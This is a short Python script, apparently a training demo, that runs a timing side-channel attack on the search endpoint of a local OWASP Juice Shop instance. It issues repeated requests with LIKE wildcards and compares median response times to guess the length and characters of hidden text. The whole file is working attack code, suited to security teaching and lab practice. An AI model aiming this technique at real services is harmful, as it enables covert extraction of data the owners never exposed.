import requests
import statistics
import argparse


def searchProductRuntime(q,n):
    times = [ float(requests.get('http://localhost:3000/rest/products/search?q='+q).headers['X-Runtime']) for i in range(n) ]
    return statistics.median(times)
    
def searchProductTime(q,n):
    times = [ requests.get('http://localhost:3000/rest/products/search?q='+q).elapsed.total_seconds() for i in range(n) ]
    return statistics.median(times)

def findLength(q,i,j,search):
    for i in range(i,j):
        n = search(q+"_"*i)
        print(q,i,n)

chars = list("abcdefghijklmnopqrtsuvwxyz0123456789_") # underscore is a single char wildcard

def findNextChar(q,search):
    for c in chars:
        i = search(q+c)
        print(q + c,i)

parser = argparse.ArgumentParser(description='Simple timing attack demo on the juice-shop search page')
parser.add_argument('QUERY',type=str) 
parser.add_argument('-n', nargs='?', default=100, type=int,help='Number of runs per request') 
parser.add_argument('-t', nargs='?', default='runtime', type=str, choices=['runtime', 'system'], help='Request time measuring technique') 
parser.add_argument('--nextchar', action='store_true',help='Find next character after QUERY') 
parser.add_argument('--length', type=int,nargs=2,metavar=('MIN','MAX'),help='Find length of text after QUERY') 

args = parser.parse_args()
print(args)

search = lambda q : searchProductRuntime(q,args.n) if args.t == "runtime" else searchProductTime(q,args.n)
q = args.QUERY
if args.nextchar:
    findNextChar(q,search)
elif args.length:
    i,j = args.length
    findLength(q,i,j,search)
else:
    n = search(q)
    print(q,n)
